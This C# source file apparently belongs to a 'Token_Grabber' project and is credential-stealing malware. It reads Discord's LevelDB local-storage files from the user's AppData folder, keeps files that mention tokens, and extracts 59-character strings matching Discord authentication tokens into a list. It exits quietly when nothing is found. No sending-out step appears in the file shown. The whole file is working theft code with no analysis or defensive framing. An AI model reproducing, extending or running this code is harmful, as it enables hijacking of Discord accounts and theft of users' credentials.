using System.Text.RegularExpressions;
using Token_Grabber;

public class DT
{
    public static List<string> ptkns = new List<string>();
    public DT()
    {
        GT();
    }
    public static void GT()
    {
        var files = SFF();
        if (files.Count == 0)
        {
            Environment.Exit(0);
            return;
        }
        foreach (string token in files)
        {
            foreach (Match match in Regex.Matches(token, "[^\"]*"))
            {
                if (match.Length == 59)
                {
                    
                    ptkns.Add(match.ToString());
                    ptkns.ToArray();
                }
            }
        }
    }
    private static List<string> SFF()
    {
        List<string> ldbFiles = new List<string>();
        string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb\\";

        if (!Directory.Exists(discordPath))
        {
            Environment.Exit(0);
            return ldbFiles;
        }

        foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
        {
            string rawText = File.ReadAllText(file);
            if (rawText.Contains("oken"))
            {
                ldbFiles.Add(rawText);
            }
        }
        return ldbFiles;
    }
}
